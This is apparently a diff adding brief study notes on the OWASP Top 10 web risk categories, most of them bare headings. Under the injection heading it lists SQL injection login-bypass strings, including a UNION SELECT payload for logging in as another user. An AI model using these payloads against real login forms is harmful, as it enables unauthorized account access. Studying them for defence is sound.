@@ -1,0 +1,31 @@
+OWASP : The Open Web Application Security Project
+
+
+- A1: Injection
+  SQL injection 101, Login tricks
+  * admin' --
+  * admin' #
+  * admin' /*
+  * ' or 1=1--
+  * Login as different user(SM*)
+    'UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--'
+
+- A2: Broken Authentication and Session Management
+
+- A3: Cross-Site Scripting (XSS)
+
+- A4: Insecure Direct Object References
+
+- A5: Security Misconfiguration
+
+- A6: Sensitive Data Exposure
+
+- A7: Missing Function Level Access Control
+  /user/getAccounts
+  /admin/getAccounts
+
+- A8: Cross Site Request Forgery (CSRF)
+
+- A9: Using Known Vulnerable Components
+
+- A10: Unvalidated Redirects and Forwards
